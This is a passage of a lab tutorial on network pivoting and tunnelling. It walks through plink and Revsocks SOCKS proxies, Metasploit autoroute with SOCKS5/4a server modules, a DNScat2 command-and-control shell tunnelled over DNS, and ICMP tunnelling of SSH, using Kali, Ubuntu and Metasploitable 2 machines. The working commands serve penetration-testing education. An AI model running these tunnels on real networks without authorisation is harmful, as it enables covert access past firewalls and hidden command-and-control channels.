<p><span style="color: #000000;">Once the connection between the Kali Linux and Ubuntu is established, let us open the browser in the Kali Linux machine and configure the proxy in the settings. Choose to manually configure the proxy and mention the local address as the socks host and the port number as 8000. Now select the <strong>socks version 5</strong> and mention the local address in ‘<strong>no proxy for</strong>’ section.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1kPLbOeOgrc/YBhFe1eND8I/AAAAAAAAtSk/s8wHqcJRkC0OyoPu_Q-i0VJbfhz6zIvFACLcBGAsYHQ/s16000/158.png"/></strong></span></p>
<p><span style="color: #000000;">Hence when you put the IP of the Metasploitable 2 in the browser of the Kali Linux, you will have an accessible connection Metasploitable 2 using dynamic SSH tunnelling with the help of plink.exe.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-dfEeSZkyPeY/YBhFpeufOEI/AAAAAAAAtSo/ycodSR-nE20vPGA3cfh97LKsG_wVR0ISACLcBGAsYHQ/s16000/159.png"/></strong></span></p>
<h3><span style="color: #800000;">Tunnelling using Revsocks</span></h3>
<p><span style="color: #000000;">Revsocks stands for Reverse socks5 tunneler. You can download it from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/kost/revsocks">here</a> </span></strong>in the windows operating system. Here in the windows system, we are trying to connect with Ubuntu using socks5.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">revsocks_windows_amd64.exe -listen :8443 -socks 0.0.0.0:1080 -pass test</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iElQZKV3h_w/YBhFyKB9sII/AAAAAAAAtSw/E1i22Kl_6hUF29h4xQTI-PlMJn6pAModQCLcBGAsYHQ/s16000/160.png"/></span></p>
<p><span style="color: #000000;">Now let’s open Ubuntu and download revsocks for Linux. Here we connect Ubuntu with Metasploitable 2 and then we move to proxy settings.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./revsocks_linux_amd64 -connect 192.168.1.3:8443 -pass test</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gvyfr7UxtkA/YBhF6txpy6I/AAAAAAAAtS4/uPM9uqvyZto2w3grjcKxP2XNBBSYlAg1wCLcBGAsYHQ/s16000/161.png"/></span></p>
<p><span style="color: #000000;">Now in the Windows machine, open the browser and open proxy settings. Here, choose to manually configure the manual proxy configuration and mention the local address in the socks host and mention the port number as 1080. Choose the <strong>socks version 5</strong> and then mention the local address in the ’<strong>no proxy for</strong>’ space.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U9EJalzpAvA/YBhGBYHP-rI/AAAAAAAAtS8/QaOa7uO56x4m9SYHtKczwaMFvI-yX3UlgCLcBGAsYHQ/s16000/162.png"/></span></p>
<p><span style="color: #000000;">When you open the web browser in the Windows machine and mention the IP address of the Metasploitable 2, you will be connected with the Metasploitable 2 using revsocks.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cDMnA-6rHxk/YBhGLDDCeCI/AAAAAAAAtTI/gx8uN9PSkVIGD5u_BGXEnypSmAXv7LTJQCLcBGAsYHQ/s16000/163.png"/></span></p>
<h3><span style="color: #800000;">Tunnelling with Metasploit (SOCKS 5 and 4a)</span></h3>
<p><span style="color: #000000;">Here we start Metasploit in the Kali machine. Then a connection is established with Ubuntu using the auxiliary module with the help of SSH. Once the connection is established, a meterpreter session was created. Then we make use of post module with autoroute. The autoroute post module will help create an additional route through the meterpreter which will allow us to dive deeper in the network. Here we will connect with Metasploitable 2. Next, we will use the auxiliary module for socks5. This is now a deprecated module. Set the localhost address and exploit. The auxiliary module will then start running.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/manage/autoroute 
use auxiliary/server/socks5 
set srvhost 127.0.0.1 
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HH0g4UcbfS4/YBhGUYSpLdI/AAAAAAAAtTQ/_b4kQViQUFg6euUN7APubwTLat6jOf2ZwCLcBGAsYHQ/s16000/164.png"/></span></p>
<p><span style="color: #000000;">Now go to the web browser in the <strong>Kali Linux</strong> machine, open the browser and open <strong>proxy settings</strong>. Here, choose to manually configure the <strong>manual proxy configuration</strong> and mention the local address in the <strong>socks host</strong> and mention the port number as 1080. Choose the <strong>socks version 5</strong> and then mention the local address in the <strong>’no proxy</strong> <strong>for</strong>’ space.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Gumj3gUrxmE/YBhGdVENsfI/AAAAAAAAtTY/9PP2aG39ABgnX_fVUUxoIpxi22NDKDs-gCLcBGAsYHQ/s16000/165.png"/></span></p>
<p><span style="color: #000000;"><strong> </strong></span><span style="color: #000000;">When you open the web browser in the Kali Linux and mention the IP address of the Metasploitable 2, you will be connected with the Metasploitable 2 using Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YTr07AVoVMI/YBhGm5VLEoI/AAAAAAAAtTc/ze99nNVcLgYj43lFIog0VyK2wqafgsOTgCLcBGAsYHQ/s16000/166.png"/></span></p>
<h3><span style="text-decoration: underline; color: #800000;">SOCKS 4a</span></h3>
<p><span style="color: #000000;">Now let’s start Metasploit in the Kali machine where the connection is established with Ubuntu with the help of auxiliary module using SSH. Then a meterpreter session was created. Then we will use the post-module where we will use autoroute. The autoroute post module will help to create additional routes through the meterpreter which will allow us to dive deeper in the network. Here we will connect with Metasploitable 2. Next, we will use the auxiliary module for socks4a. This is now a deprecated module. Instead, we can use the new module Set the localhost address and exploit. The auxiliary module will then start running.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/manage/autoroute 
use auxiliary/server/socks4a 
set srvhost 127.0.0.1 
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iNd9_TDKXBQ/YBhGukMV7wI/AAAAAAAAtTk/i2AS7Ryagwo41RM1vaIdsBIVeJ9kDPW2gCLcBGAsYHQ/s16000/167.png"/></span></p>
<p><span style="color: #000000;">Hence, open the web browser in the Kali Linux machine, and open<strong> proxy settings</strong>. Now, choose to manually configure the<strong> manual proxy configuration</strong> and mention the local address in the socks host and mention the port number as 1080. Choose the <strong>socks version 4a</strong> and then mention the local address in the ’<strong>no proxy for</strong>’ space.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eTNZl2yADSQ/YBhG1ZteT-I/AAAAAAAAtTo/tQ3ZK-J1feQ2f4VHPkeM9tzvmJD_8dwSACLcBGAsYHQ/s16000/165.png"/></span></p>
<p><span style="color: #000000;">Finally, when you open the web browser in the Kali Linux and mention the IP address of the Metasploitable 2, you will be connected with the Metasploitable 2 using Metasploit.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-pSFSsQvOPyU/YBhG-A1VT9I/AAAAAAAAtT0/kTZi__KCldorhl8vTdFN_FjkdI2709l7wCLcBGAsYHQ/s16000/166.png"/></strong></span></p>
<h3><span style="color: #800000;">Tunnelling with DNScat2</span></h3>
<p><span style="color: #000000;">DNScat2 is a tool which can be used to create a tunnel with the help of DNS protocol. A connection to port 53 should be established to access any data. DNScat2 mainly consists of a client and a Kali Linux. In our scenario, we need to establish a connection between Metasploitable 2 and Kali Linux using Ubuntu as the medium.</span></p>
<p><span style="color: #000000;">Let’s begin with installing DNScat2 in the Kali Linux machine using apt install which will automatically build dependencies.</span></p>
<h4><span style="color: #000000;"><u>DNScat2 Tunneling on Port 22</u></span></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install dnscat2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j7kOr-1I3aI/YBhHXv4OsXI/AAAAAAAAtUE/OMkGwpixkj8HdJQWdQHw2bnVNe3KSvTzACLcBGAsYHQ/s16000/100.png"/></span></p>
<p><span style="color: #000000;">Once this is done, the dnscat2 server will start running.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WT4aGskG4DE/YBhHhpqh8nI/AAAAAAAAtUM/AngC2ADHo0IaKZd9bGs4YEFo-yj9balDACLcBGAsYHQ/s16000/101.png"/></span></p>
<p><span style="color: #000000;">In the Ubuntu machine, we will install dnscat2 using git clone. Here we will have to install the dependencies manually to get the tool started.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/iagox86/dnscat2.git 
cd dnscat2/ 
cd client/ 
make</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tjIcaw5-9CY/YBhHrAurDpI/AAAAAAAAtUU/4E-otD73W-w2wKttU-AWaU2d9NcVHeudgCLcBGAsYHQ/s16000/102.png"/></span></p>
<p><span style="color: #000000;">Now let’s establish a connection between the Kali Linux and Ubuntu.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./dnscat --dns=server=192.168.1.2,port=53</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZEJCm4gXCmA/YBhHxWRsraI/AAAAAAAAtUc/DtdtaOa8uqU9EQ7tfoR-rxq8OqWaPxgqwCLcBGAsYHQ/s16000/103.1.png"/></span></p>
<p><span style="color: #000000;">After we establish the connection successfully, the Kali Linux machine creates a session. Next, we check the available sessions. Then, we interact with one of them and send a request to create a shell. As soon as the request is accepted, the system opens a new window and starts session 2.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">session 
session -i 1 
shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DSCWwQMrFic/YBhH3jqoqzI/AAAAAAAAtUg/T7TSx6afQL47o46p1i9zbEmD_XZSHIzPgCLcBGAsYHQ/s16000/103.png"/></span></p>
<p><span style="color: #000000;">Using the second session, you now have access to the Ubuntu machine. So now let’s check the IP address of the client one machine. Here we see that Ubuntu has two NIC cards installed within it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">session -i 2 
ifconfig</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PmOrzt7ayCI/YBhH9IYry5I/AAAAAAAAtUk/GC5ZGOc4yHAgR5AUkN13Ai-aeKvpMUHeQCLcBGAsYHQ/s16000/104.png"/></span></p>
<p><span style="color: #000000;">Then, we will connect the Metasploitable 2 port 22 to the port 8888 to create a DNS tunnel between them using the shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listen 127.0.0.1:8888 192.168.226.129:22</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AjPfEm3Enag/YBhIDNLYIHI/AAAAAAAAtUo/fuOmXyVf0ZQuPQ06EtWqgAXRliQlNPTMACLcBGAsYHQ/s16000/105.png"/></span></p>
<p><span style="color: #000000;">Finally, open a new tab in the Kali Linux machine and login to the Metasploitable 2 machine with its credentials and now you will be able to communicate with Metasploitable 2 using the Kali Linux.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh msfadmin@127.0.0.1 -p 8888</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NuqyW-wyrm4/YBhIKtu6b2I/AAAAAAAAtUs/XDKhOQ6LVv459mUpRIA0UGf6e3v51jcaACLcBGAsYHQ/s16000/106.png"/></span></p>
<h4><span style="color: #000000;"><u>DNScat2 Tunnelling on port 80</u></span></h4>
<p>We can perform the same using port 80.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listen 127.0.0.1:9999 192.168.226.129:80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Oflh8tnv7dE/YBhISlCPIqI/AAAAAAAAtU0/MrLCD-_K2TgMFwDr9aWt6FOECKbMK5CFACLcBGAsYHQ/s16000/107.png"/></span></p>
<p><span style="color: #000000;">When we open the web browser on the Kali Linux machine and enter the URL of the Metasploitable 2 machine, we can see that the connection is successfully established. This confirms the connection between the Kali Linux and Metasploitable 2, running on Ubuntu.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4EYLdQPl0yA/YBhIYYmnjTI/AAAAAAAAtU8/F5TvekM6UWoI1ZRgK6f_yXDOW7IQmRtHQCLcBGAsYHQ/s16000/108.png"/></span></p>
<p><span style="color: #000000;">Similarly, the same can be done in the windows system Follow this link <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://downloads.skullsecurity.org/dnscat2/">here</a></strong><strong> </strong></span>to download a suitable dnscat2 client for your system of windows. To get a detailed explanation on DNScat2 you can read <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/dnscat2-application-layer-cc/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;">ICMP Tunneling</span></h3>
<p><span style="color: #000000;">The main aim of the ICMP tunnel is to send TCP connection where an SSH session will be used in an encapsulated form of ICMP packets. Let’s first configure the ICMP tunnel on the Ubuntu machine. You can read a detailed article from <a href="https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;">We will first download and install icmptunnel on the server-side and compile the file by unpacking its components.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel 
make</pre>
<p><span style="color: #000000;">Then we will disable ICMP echo reply on both the Ubuntu and the Kali Linux. This halts the kernel from responding to any of its packets.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 
./icmptunnel -s 
Ctrl+z 
bg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-adkRdLLcG9k/YBhIfzMdOXI/AAAAAAAAtVE/gOFfyOEHEQ03cW8Z-DIs-4pIP2dJxZOOQCLcBGAsYHQ/s16000/81.png"/></span></p>
<p><span style="color: #000000;">Secondly, let’s start the ICMP tunnel on Ubuntu on server mode and assign it a new IP address for tunnelling.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0
ifconfig</pre>
<pre class="lang:default decode:true"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HUpoTLoSLIE/YBhImCsbV6I/AAAAAAAAtVM/McLd_9fVSUgfA9MTdwCdmsu4JSKvxdBVQCLcBGAsYHQ/s16000/82.png"/></span></pre>
<p><span style="color: #000000;">Then, let’s install and set up ICMP tunnel on the client-side i.e Kali Linux as we did in Ubuntu.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel 
make 
echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 
./icmptunnel 192.168.1.108 
Ctrl+z 
bg 
/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 
ifconfig</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Pva3K_G4Wq0/YBhIthYoVzI/AAAAAAAAtVU/ZeIhErpdHIgm31qGBdcM0FvlngVLdG3DACLcBGAsYHQ/s16000/83.png"/></strong></span></p>
<p><span style="color: #000000;"> After creating the second IP address for tunnelling on the Kali machine, we initiate an SSH connection. To do this, we use the server-side credentials with the IP address 10.0.0.1.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh raj@10.0.0.1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JeMJzbrR72Q/YBhIz9vyOwI/AAAAAAAAtVY/44NtrIx7fHEuzxEhMdPAp2Y9VCkL5lApgCLcBGAsYHQ/s16000/84.png"/></span></p>
<p><span style="color: #000000;">Finally, when we launch Wireshark and capture the packets, we notice something interesting. All the SSH packets, which normally use TCP, are now transported over the ICMP protocol. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X_eY8J4c1hc/YBhI5L8qNoI/AAAAAAAAtVg/654D1svBJt8jHRg_J3Yz2lYy5a4wYfdswCLcBGAsYHQ/s16000/85.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">Therefore in this article, we have seen the effectiveness of various port forwarding and Tunnelling methods to provide a secure and encrypted connection.</span></p>
<p><span style="color: #000000;"><strong>Author: Jeenali Kothari</strong> is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on<strong><a style="color: #000000;" href="https://www.linkedin.com/in/jeenali-kothari"> <span style="color: #0000ff;">Here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
